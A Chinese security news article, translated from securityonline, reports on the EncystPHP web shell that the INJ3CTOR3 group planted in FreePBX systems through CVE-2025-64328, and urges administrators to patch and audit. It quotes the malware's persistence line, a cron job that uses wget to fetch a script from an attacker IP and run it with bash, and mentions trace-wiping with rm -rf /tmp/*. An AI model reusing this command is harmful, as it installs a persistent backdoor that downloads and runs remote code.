---
title: 新型高级Web后门潜入通信基础设施，利用高危漏洞将电话系统变为持久化后门
url: https://www.anquanke.com/post/id/314704
source: 安全客-有思想的安全新媒体
date: 2026-02-04
fetch_date: 2026-02-05T04:07:41.069094
---

# 新型高级Web后门潜入通信基础设施，利用高危漏洞将电话系统变为持久化后门

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 新型高级Web后门潜入通信基础设施，利用高危漏洞将电话系统变为持久化后门

阅读量**31070**

发布时间 : 2026-02-04 11:26:44

**x**

##### 译文声明

本文是翻译文章，文章原作者 Ddos ，文章来源：securityonline

原文地址：<https://securityonline.info/silent-intruder-encystphp-web-shell-burrows-into-freepbx-systems/>

译文仅供参考，具体内容表达以及含义原文为准。

![]()

研究人员发现一款新型高级 Web 后门已潜入通信基础设施，该恶意程序利用**高危漏洞**将正常的电话系统改造为可长期控制的后门。飞塔安全防护实验室（FortiGuard Labs）将其命名为**EncystPHP**，这款恶意软件是针对 FreePBX 环境攻击行动的最新武器，而 FreePBX 是一款广泛应用的开源 IP 语音（VoIP）服务管理平台。

相关攻击行动始于 12 月初，攻击者利用一个**身份验证后命令注入漏洞（CVE-2025-64328）** 突破网络边界。成功入侵后，该恶意软件将被激活，其**搭载多项高级功能，包括远程命令执行、持久化驻留机制及 Web 后门部署**。

此次攻击行动被证实为某知名黑客组织的手笔，飞塔安全防护实验室已将该攻击行为溯源至黑客组织**INJ3CTOR3**—— 这一威胁行为者向来以攻击 VoIP 系统为主要目标。

该组织最早于 2020 年被发现利用 CVE-2019-19006 漏洞发起攻击，2022 年又将攻击目标转向 Elastix 系统，如今其攻击手段再次升级。报告指出：**我们判定此次攻击行动，属于 INJ3CTOR3 组织近期的攻击活动及行为模式**。

已监测到的攻击事件均遵循固定流程：**先利用 FreePBX 漏洞实施攻击，再在目标环境中部署 PHP Web 后门**。有记录显示，某起攻击的源地址为巴西，攻击目标是一家主营云服务与通信服务的印度科技公司所管理的业务环境。

EncystPHP 被设计为**高度隐蔽的恶意程序**，它通过模仿 FreePBX 的合法组件，试图**规避安全工具的即时检测**，从而在被入侵的服务器中隐秘驻留。

但其攻击能力却十分强悍，这款 Web 后门为攻击者提供了一套功能完善的受害主机控制工具，支持攻击者**执行任意系统命令**，相当于让攻击者掌握了整个 PBX 系统的控制权。

最令人警惕的是，该恶意软件**高度重视持久化驻留能力**。报告详细说明，EncystPHP 会利用 Linux 标准工具实现持久化驻留，确保自身能在系统重启或简单的安全清理操作后依然存活。

分析结果显示：**该恶意软件会通过 wget 工具创建定时任务（cron jobs），从外部 IP 地址（45.234.176.202）下载并执行恶意脚本**。同时，它还会实施痕迹清理操作，执行`rm -rf /tmp/*`命令删除临时文件，并通过 sed 命令篡改系统日志。

研究人员发现其持久化脚本为**license.php**，其中包含如下核心代码行：

`system("echo '*/1 * * * * wget http://45.234.176.202/new/k.php -O /var/lib/asterisk/bin/devnull2; bash /var/lib/asterisk/bin/devnull2' | crontab -");`

此次事件为企业敲响警钟：**通信系统仍是网络犯罪分子的高价值攻击目标**。报告强调：**该事件证明，攻击者可利用 CVE-2025-64328 漏洞部署隐蔽的持久化 Web 后门，这也凸显了未打补丁的 PBX 系统始终是黑客的重点攻击对象**。

飞塔安全实验室敦促所有运行 FreePBX 系统的管理员**立即安装漏洞补丁**，并对系统进行全面审计，排查是否存在 EncystPHP 后门痕迹及未授权的定时任务。研究人员指出，尽管此次攻击所使用的技术并非全新手段，但相关威胁**仍处于活跃且持续扩散的状态**。

本文翻译自securityonline [原文链接](https://securityonline.info/silent-intruder-encystphp-web-shell-burrows-into-freepbx-systems/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/314704](/post/id/314704)

安全KER - 有思想的安全新媒体

本文转载自: [securityonline](https://securityonline.info/silent-intruder-encystphp-web-shell-burrows-into-freepbx-systems/)

如若转载,请注明出处： <https://securityonline.info/silent-intruder-encystphp-web-shell-burrows-into-freepbx-systems/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [安全资讯](/tag/%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF)
* [漏洞情报](/tag/%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5)

**+1**0赞

收藏

![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p3.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=171771)

[安全客](/member.html?memberId=171771)

这个人太懒了，签名都懒得写一个

* 文章
* **1000**

* 粉丝
* **6**

### TA的文章

* ##### [“Exfil Out&Look”漏洞致攻击者可通过OWA隐秘窃取邮件](/post/id/314701)

  2026-02-04 11:28:08
* ##### [新型高级Web后门潜入通信基础设施，利用高危漏洞将电话系统变为持久化后门](/post/id/314704)

  2026-02-04 11:26:44
* ##### [暗网现新型工业控制系统攻击框架，直指能源基础设施](/post/id/314710)

  2026-02-04 11:26:03
* ##### [微软新版Windows 11更新悄然收紧存储设置权限](/post/id/314713)

  2026-02-04 11:25:28
* ##### [Apache Syncope修复高危登录跨站脚本及外部实体注入漏洞](/post/id/314719)

  2026-02-04 11:24:58

### 相关文章

* ##### [“Exfil Out&Look”漏洞致攻击者可通过OWA隐秘窃取邮件](/post/id/314701)

  2026-02-04 11:28:08
* ##### [暗网现新型工业控制系统攻击框架，直指能源基础设施](/post/id/314710)

  2026-02-04 11:26:03
* ##### [微软新版Windows 11更新悄然收紧存储设置权限](/post/id/314713)

  2026-02-04 11:25:28
* ##### [Apache Syncope修复高危登录跨站脚本及外部实体注入漏洞](/post/id/314719)

  2026-02-04 11:24:58
* ##### [Notepad++被劫持国家级攻击者投毒更新包，持续数月作恶](/post/id/314722)

  2026-02-04 11:24:22
* ##### [Open VSX供应链攻击事件，黑客利用遭攻陷开发者账户传播GlassWorm恶意程序](/post/id/314725)

  2026-02-04 11:23:54
* ##### [WiFi劫持风险，海康威视修复DS-3WAP系列无线接入点命令注入漏洞](/post/id/314716)

  2026-02-04 11:23:22

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)